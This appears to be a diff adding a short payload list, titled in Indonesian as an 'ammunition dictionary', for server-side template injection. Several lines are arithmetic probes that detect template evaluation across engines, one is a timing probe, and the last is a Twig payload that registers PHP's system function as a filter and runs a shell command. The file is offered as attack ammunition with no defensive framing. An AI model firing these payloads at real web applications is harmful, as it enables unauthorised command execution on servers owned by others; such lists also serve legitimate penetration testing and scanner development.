@@ -1,0 +1,7 @@
+# === KAMUS AMUNISI V8: SERVER-SIDE TEMPLATE INJECTION ===
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{import('time').sleep(5)}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("sleep 5")}}
